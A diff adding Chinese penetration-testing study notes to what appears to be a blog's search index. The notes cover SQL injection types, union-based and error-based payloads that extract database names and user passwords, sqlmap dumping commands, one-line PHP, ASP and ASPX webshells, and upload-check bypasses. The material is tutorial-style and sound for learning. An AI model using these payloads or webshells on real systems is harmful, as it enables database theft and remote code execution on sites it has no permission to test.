@@ -1575,6 +1575,104 @@ TTL大于100的一般为windows,几十的一般为linux。</li>
 <li>EHole</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd D:\渗透\EHole\EHole_windows_amd64</span><br><span class="line">EHole_windows_amd64.exe -h</span><br><span class="line"></span><br><span class="line"># URL地址需带上协议,每行一个</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt</span><br><span class="line"># 支持单IP或IP段</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1/24</span><br><span class="line"># 结果输出至export.json文件</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt -json export.json</span><br></pre></td></tr></table></figure>
+<h1>漏洞挖掘</h1>
+<h2 id="SQL注入">SQL注入</h2>
+<h3 id="基础语法">基础语法</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找</span><br><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">SELECT * FROM 表名</span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">DELETE * FROM 表名称</span><br><span class="line"># 更新</span><br><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br><span class="line"># 增加</span><br><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line"></span><br><span class="line"># 字符截取</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select mid(database(),1,1)</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select substr(database(),1,1)</span><br><span class="line"></span><br><span class="line"># 左右字符</span><br><span class="line"># 返回当前数据库最左边的1个字符串</span><br><span class="line">select left(database(),1);</span><br><span class="line"># 返回当前数据库最右边的1个字符串</span><br><span class="line">select right(database(),1);</span><br><span class="line"></span><br><span class="line"># 字符ASCII</span><br><span class="line"># 结果为1或者0，也就是true or false</span><br><span class="line">select ascii(substr(database(),1,1))&gt;97;</span><br><span class="line">select ord(substr(database(),1,1))&gt;97;</span><br><span class="line"></span><br><span class="line"># 行数</span><br><span class="line"># 返回查询结果行数</span><br><span class="line">select count(username) from users;</span><br><span class="line"></span><br><span class="line">#合并</span><br><span class="line">select group_concat(a) from (select database() as a union select version() as a) as t;</span><br><span class="line"></span><br><span class="line"># 基础信息</span><br><span class="line"># 在sql语言中，and优先级大于or</span><br><span class="line">--+     注释符</span><br><span class="line">limit 0,1      从你表中的第一个数据开始，只读取一个</span><br><span class="line">order by      排序，判断字段数量，也就是表的列数</span><br><span class="line">union select  联合查询，连接前面语句，起着合并查询的作用</span><br><span class="line">group_concat  合并多行数据到一行</span><br><span class="line">version()    当前数据库版本</span><br><span class="line">database()   当前数据库</span><br><span class="line">@@datadir    数据库数据路径</span><br><span class="line">@@version_compile_os    操作系统版本</span><br></pre></td></tr></table></figure>
+<h3 id="系统表">系统表</h3>
+<p>在MySQL中，把information_schema看作是一个数据库，确切说是信息数据库。保存数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<blockquote>
+<ul>
+<li>SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。<br>
+show databases; 的结果取之此表。</li>
+</ul>
+<p>Schema.name列：所有数据库名</p>
+<ul>
+<li>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<br>
+show tables from schemaname; (schemaname为指定数据库名)的结果取之此表。</li>
+</ul>
+<p>Table.name列：所有表名<br>
+Table.schema列：来自哪个数据库</p>
+<ul>
+<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<br>
+show columns from schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。</li>
+</ul>
+<p>Column_name列：所有列名<br>
+Table.name列：来自哪个表<br>
+Table.schema列：来自哪个数据库</p>
+</blockquote>
+<h3 id="判断是否有漏洞">判断是否有漏洞</h3>
+<p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
+<h3 id="类型">类型</h3>
+<blockquote>
+<p>按参数类型分类：<br>
+数字型<br>
+字符型<br>
+搜索型<br>
+按数据库返回结果分类：<br>
+回显注入<br>
+报错注入<br>
+盲注<br>
+基于布尔的盲注<br>
+基于时间的盲注<br>
+按注入点位置分类：<br>
+GET注入<br>
+POST注入<br>
+Cookie注入<br>
+Header注入<br>
+… …</p>
+</blockquote>
+<h4 id="数字型">数字型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.and逻辑测试：</span><br><span class="line"></span><br><span class="line">and 1=1  sql语句： select name from users where id=1 and 1=1</span><br><span class="line">and 1=2  sql语句： select name from users where id=1 and 1=2</span><br><span class="line"></span><br><span class="line">通过比较页面的变化判断输入是否被带入数据库执行。</span><br><span class="line"></span><br><span class="line">2.单引号测试：</span><br><span class="line"></span><br><span class="line">sql语句： select name from users where id=1&#x27;</span><br><span class="line"></span><br><span class="line">构造sql语法错误，来判断输入是否被执行。</span><br></pre></td></tr></table></figure>
+<h4 id="字符型">字符型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;、id=1&quot;  构造sql语法错误，来判断输入是否被执行。</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="搜索型">搜索型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL=&quot;select * from users where name like &#x27;%tom%&#x27;&quot;</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;</span><br><span class="line">这个输入显然会报错误。</span><br><span class="line"></span><br><span class="line">1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1</span><br><span class="line">SQL查询语句：select * from users where name like &#x27;%1%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;</span><br><span class="line">这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。</span><br></pre></td></tr></table></figure>
+<h4 id="GET显错注入">GET显错注入</h4>
+<p>流程</p>
+<blockquote>
+<p>01、获取字段数    order by x<br>
+02、获取显示位    union select 1,2,3,4……<br>
+03、获取数据库信息        version()，user()，@@datadir<br>
+04、获取当前数据库        database()， schema()<br>
+05、获取所有数据库<br>
+06、获取数据库表<br>
+07、获取所有字段<br>
+08、获取数据</p>
+<ul>
+<li>确定数字、字符、搜索型</li>
+<li>注入点</li>
+<li>当前数据库长度</li>
+<li>遍历得当前数据库名称</li>
+<li>获取数据库表总数</li>
+<li>依次获取表的长度、名字</li>
+<li>获取列</li>
+<li>获取数据</li>
+</ul>
+</blockquote>
+<p>注入步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断：</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=-1&#x27; or 1=1 --+</span><br><span class="line"></span><br><span class="line"># order by语句判断字段数量：</span><br><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line"></span><br><span class="line"># 联合查询获取显示位：</span><br><span class="line">id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库：</span><br><span class="line">id=-1&#x27; union select 1,(select database()),3 --+</span><br><span class="line"></span><br><span class="line"># 获取所有数据库：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库表名：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取users表所有字段：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段内容：</span><br><span class="line">id=-1&#x27; union select 1,username,password from users --+</span><br></pre></td></tr></table></figure>
+<h4 id="报错注入">报错注入</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+<h3 id="绕过">绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符可替换空格 /**/ # --</span><br><span class="line"></span><br><span class="line">内联注入</span><br><span class="line">/*!/*!*/</span><br><span class="line">/* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="工具使用">工具使用</h3>
+<ul>
+<li>sqlmap</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入sqlmap目录</span><br><span class="line"></span><br><span class="line"># 检测漏洞</span><br><span class="line">python sqlmap.py [url]</span><br><span class="line">python sqlmap.py -u http://mingy.lab/Less-1/?id=1</span><br><span class="line"></span><br><span class="line"># 获取当前用户</span><br><span class="line">python sqlmap.py -u [url] --current-user</span><br><span class="line"># 当前数据库</span><br><span class="line">python sqlmap.py -u [url] --current-db</span><br><span class="line"># 所有数据库名</span><br><span class="line">python sqlmap.py -u [url] --dbs</span><br><span class="line"># 数据库表名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] --tables</span><br><span class="line"># 列名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] --columns</span><br><span class="line"># 字段值</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] -C [列名1],[列名2] --dump</span><br><span class="line"></span><br><span class="line"># post注入</span><br><span class="line">python sqlmap.py -r aa.txt</span><br><span class="line">python sqlmap.py -r aa.txt --current-db --tables</span><br><span class="line"></span><br><span class="line"># aa.txt内容示例如下：</span><br><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=123456</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">#请求方法（如 POST）|目标路径（如 /login.php）|Host 头和其他必要头部（如 Content-Type）|空一行后接 POST 数据（如 username=...&amp;password=...）</span><br></pre></td></tr></table></figure>
+<h2 id="文件上传">文件上传</h2>
+<h3 id="常见一句话木马">常见一句话木马</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php一句话木马： </span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">asp一句话木马： </span><br><span class="line">&lt;%eval request(&quot;value&quot;)%&gt;</span><br><span class="line">aspx一句话木马： </span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="绕过-2">绕过</h3>
+<ul>
+<li>绕过客户端检测/JS检测</li>
+</ul>
+<p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p>
+<p>方法：在本地浏览器客户端禁用]S即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现，利用burpsuite可以绕过一切客户端检测。</p>
+<ul>
+<li>绕过服务端检测</li>
+</ul>
 ]]></content>
   </entry>
 </search>
